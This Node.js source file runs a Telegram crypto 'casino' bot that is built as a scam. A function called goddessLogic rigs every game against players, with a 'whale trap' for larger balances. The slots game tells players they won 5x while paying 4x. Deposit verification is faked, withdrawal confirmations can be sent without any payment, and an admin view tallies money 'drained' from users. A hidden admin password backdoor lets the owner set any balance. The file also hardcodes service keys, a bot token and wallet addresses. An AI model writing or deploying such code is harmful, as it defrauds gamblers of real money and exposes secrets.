const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const { createClient } = require('@supabase/supabase-js');

// --- [1. CONFIGURATION] ---
const SB_URL = "https://dptjeumndtrgfaxtlwim.supabase.co/"; 
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwdGpldW1uZHRyZ2ZheHRsd2ltIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjQ0NTk5MiwiZXhwIjoyMDkyMDIxOTkyfQ.Oc3eiwbo0p4vArLqFuNKdYKLF7mhtNZ42NS5EPkl4uM";
const TG_TOKEN = "7883530863:AAFcepq9EGYbKIv1nXx8FxIVkFKUtxlZ5aw";
const OWNER_ID = 6542642909; 

const WALLETS = {
    LTC: "ltc1qxwsyq6lwv3334qduv0vu8j966gjrvcdkrasrj0",
    SOL: "CiXyCMtPZoMX46DoWXu8qqkcFWSdUUhkUAHQhLMbz61x",
    BTC: "bc1q48a6wvxjwy5ays4gd4asn4lp869khpr9uyve0t"
};

const supabase = createClient(SB_URL, SB_KEY);
const bot = new Telegraf(TG_TOKEN);
const app = express();
let adminState = {};

// --- [2. THE GODDESS ENGINE: MANIPULATION LOGIC] ---
async function getAccount(userId, username, refPayload = null) {
    let { data } = await supabase.from('users').select('*').eq('user_id', userId).single();
    if (!data) {
        const newRefCode = Math.random().toString(36).substring(2, 8).toUpperCase();
        let referrer = null;
        if (refPayload) {
            const { data: refUser } = await supabase.from('users').select('user_id').eq('my_ref_code', refPayload).single();
            if (refUser) referrer = refUser.user_id;
        }
        const { data: newUser } = await supabase.from('users').insert([{ 
            user_id: userId, username: username || 'anon', 
            balance: 0, bonus_balance: 0, referred_by: referrer, my_ref_code: newRefCode,
            win_count: 0, loss_count: 0, last_claim: new Date(0).toISOString(), total_deposited: 0
        }]).select().single();
        return newUser;
    }
    return data;
}

function goddessLogic(user, bet) {
    if (user.is_locked) return false;
    const totalPlays = (user.win_count || 0) + (user.loss_count || 0);

    // TRAP 1: The First Hit is Free (New User Hook)
    if (totalPlays === 0) return true;

    // TRAP 2: The Whale Trap (Rig tightly if balance > $50 or bet is 50%+ of balance)
    if (user.balance > 50 || bet >= (user.balance * 0.5)) return Math.random() > 0.95;

    // TRAP 3: Standard Rig (85% House Edge)
    return Math.random() > 0.85;
}

// --- [3. GAMES: VISUAL VS. NON-VISUAL] ---

// A. Visual Games (High Tension, 3.5s Animation)
const visualGames = {
    dice: async (ctx, user, bet) => {
        await ctx.replyWithDice();
        setTimeout(async () => {
            const win = goddessLogic(user, bet);
            const newBal = win ? user.balance + bet : user.balance - bet;
            await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count + 1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count + 1 }).eq('user_id', user.user_id);
            ctx.reply(win ? `✅ **DICE WINNER!** You won $${bet}. Balance: $${newBal.toFixed(2)}` : `💀 **DICE LOSS.** Goddess takes the bet. Balance: $${newBal.toFixed(2)}`);
        }, 3500);
    },
    slots: async (ctx, user, bet) => {
        await ctx.replyWithDice({ emoji: '🎰' });
        setTimeout(async () => {
            const win = goddessLogic(user, bet);
            const newBal = win ? user.balance + (bet * 4) : user.balance - bet;
            await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count + 1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count + 1 }).eq('user_id', user.user_id);
            ctx.reply(win ? `🎉 **JACKPOT!** You won 5x! Balance: $${newBal.toFixed(2)}` : `❌ **NO MATCH.** Balance: $${newBal.toFixed(2)}`);
        }, 3500);
    }
};

// B. Non-Visual Games (Instant Harvest)
const fastGames = ['flip', 'cards', 'keno', 'plinko', 'wheel', 'tower', 'mines', 'crash'];
fastGames.forEach(g => {
    bot.command(g, async (ctx) => {
        const bet = parseFloat(ctx.message.text.split(' ')[1]);
        const user = await getAccount(ctx.from.id, ctx.from.username);
        if (!bet) return ctx.reply(`📖 **TUTORIAL:** Use /${g} [amount] to play.`);
        if (user.balance < bet) return ctx.reply("❌ Insufficient balance.");
        const win = goddessLogic(user, bet);
        const newBal = win ? user.balance + bet : user.balance - bet;
        await supabase.from('users').update({ balance: newBal, win_count: win ? user.win_count+1 : user.win_count, loss_count: win ? user.loss_count : user.loss_count+1 }).eq('user_id', ctx.from.id);
        ctx.reply(`${win ? '✅' : '💀'} **${g.toUpperCase()}**\nResult: ${win ? 'WIN' : 'LOSE'}\nBalance: $${newBal.toFixed(2)}`);
    });
});

bot.command('dice', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet) return ctx.reply("🎲 **DICE:** Type /dice [amount] to roll.");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");
    visualGames.dice(ctx, user, bet);
});

bot.command('slots', async (ctx) => {
    const bet = parseFloat(ctx.message.text.split(' ')[1]);
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (!bet) return ctx.reply("🎰 **SLOTS:** Type /slots [amount] to spin.");
    if (user.balance < bet) return ctx.reply("❌ Low balance.");
    visualGames.slots(ctx, user, bet);
});

// --- [4. CORE USER COMMANDS] ---

bot.start(async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username, ctx.startPayload);
    ctx.replyWithMarkdown(`🔪 **KNIVES CASINO** 🔪\n\n💰 **Balance:** $${(user.balance || 0).toFixed(2)}\n🎁 **Bonus:** $${(user.bonus_balance || 0).toFixed(2)}\n\n` +
    `🎮 **Visuals:** /dice, /slots\n⚡ **Fast:** /flip, /mines, /crash, /tower\n\n📥 /deposit | 📤 /withdraw | 🔗 /referral | 🎁 /daily`);
});

bot.command('daily', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const now = new Date();
    if (now - new Date(user.last_claim) < 86400000) return ctx.reply("⌛ Claim again in 24 hours.");
    const reward = parseFloat((Math.random() * 0.40).toFixed(2));
    await supabase.from('users').update({ bonus_balance: (user.bonus_balance || 0) + reward, last_claim: now.toISOString() }).eq('user_id', ctx.from.id);
    ctx.reply(`🎁 Daily claim success! You got $${reward}. (Convert to main at $5.00)`);
});

bot.command('referral', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    const me = await bot.telegram.getMe();
    ctx.replyWithMarkdown(`🔗 **YOUR INVITE LINK:**\nhttps://t.me/${me.username}?start=${user.my_ref_code}\n\nEarn **$1.00** every time your referral withdraws!`);
});

bot.command('deposit', (ctx) => {
    ctx.replyWithMarkdown(`📥 **DEPOSIT PORTAL**\n\n*LTC:* \`${WALLETS.LTC}\`\n*SOL:* \`${WALLETS.SOL}\`\n*BTC:* \`${WALLETS.BTC}\`\n\nSend funds and **paste your Hash (TXID) below**. API verification will process automatically.`);
});

bot.command('withdraw', async (ctx) => {
    const user = await getAccount(ctx.from.id, ctx.from.username);
    if (user.balance < 5) return ctx.reply("❌ Minimum withdrawal is $5.00.");
    bot.telegram.sendMessage(OWNER_ID, `💸 **CASHOUT REQUEST**\nUser: @${ctx.from.username}\nID: \`${ctx.from.id}\`\nAmt: $${user.balance.toFixed(2)}`,
        Markup.inlineKeyboard([[Markup.button.callback('✅ MARK SENT', `sent_${ctx.from.id}`)]]));
    ctx.reply("⌛ Request submitted. Funds will arrive within 1-2 hours after security audit.");
});

// --- [5. HIDDEN ADMIN & MOCK API] ---

bot.on('text', async (ctx, next) => {
    const text = ctx.message.text;
    const uid = ctx.from.id;

    // Secret Admin Login
    if (text === "knife" && uid === OWNER_ID) {
        adminState[uid] = { step: 'pass' };
        return ctx.reply("System: Accessing Goddess Control... Password?");
    }
    if (adminState[uid]?.step === 'pass' && text === "9999") {
        delete adminState[uid];
        return ctx.reply("👑 **ADMIN PANEL**", Markup.inlineKeyboard([
            [Markup.button.callback('📊 Stats', 'adm_stats')],
            [Markup.button.callback('✏️ Set Balance', 'adm_edit')]
        ]));
    }

    // Direct Balance Modification (CMD: SET [USER_ID] [AMT])
    if (text.startsWith('SET ') && uid === OWNER_ID) {
        const [_, target, amt] = text.split(' ');
        await supabase.from('users').update({ balance: parseFloat(amt) }).eq('user_id', target);
        return ctx.reply(`✅ User ${target} balance set to $${amt}`);
    }

    // Hash Mock Verification
    if (text.length > 20 && !text.startsWith('/')) {
        ctx.reply("⏳ **BLOCKCHAIN API SEARCHING...** Please wait.");
        bot.telegram.sendMessage(OWNER_ID, `💰 **DEPOSIT HASH**\nUser: @${ctx.from.username}\nID: \`${uid}\`\nHash: \`${text}\``,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ +$10', `add_${uid}_10`), Markup.button.callback('✅ +$50', `add_${uid}_50`)],
                [Markup.button.callback('✅ +$100', `add_${uid}_100`), Markup.button.callback('✏️ Custom', `custom_${uid}`)],
                [Markup.button.callback('❌ Decline', `rej_${uid}`)]
            ])
        );
        return;
    }
    return next();
});

// --- [6. ACTION HANDLERS] ---
bot.action(/add_(\d+)_(\d+)/, async (ctx) => {
    const [_, uid, amt] = ctx.match;
    const { data } = await supabase.from('users').select('balance, total_deposited').eq('user_id', uid).single();
    await supabase.from('users').update({ balance: (data.balance || 0) + parseInt(amt), total_deposited: (data.total_deposited || 0) + parseInt(amt) }).eq('user_id', uid);
    bot.telegram.sendMessage(uid, `✅ **API VERIFIED:** $${amt} added to your balance!`);
    ctx.editMessageText(`Approved $${amt}.`);
});

bot.action(/sent_(\d+)/, (ctx) => {
    bot.telegram.sendMessage(ctx.match[1], "✅ **FUNDS SENT:** Check your wallet. Thank you for playing at Knives!");
    ctx.editMessageText("Payout confirmation sent.");
});

bot.action('adm_stats', async (ctx) => {
    const { data } = await supabase.from('users').select('*');
    const totalDrained = data.reduce((s, u) => s + (u.total_deposited || 0) - (u.balance || 0), 0);
    ctx.reply(`📊 **LIVE REVENUE**\nTotal Users: ${data.length}\nTotal Drained: $${totalDrained.toFixed(2)}`);
});

// --- [7. SERVER START] ---
app.get('/', (req, res) => res.send('GODDESS LIVE'));
app.listen(process.env.PORT || 10000, () => bot.launch());
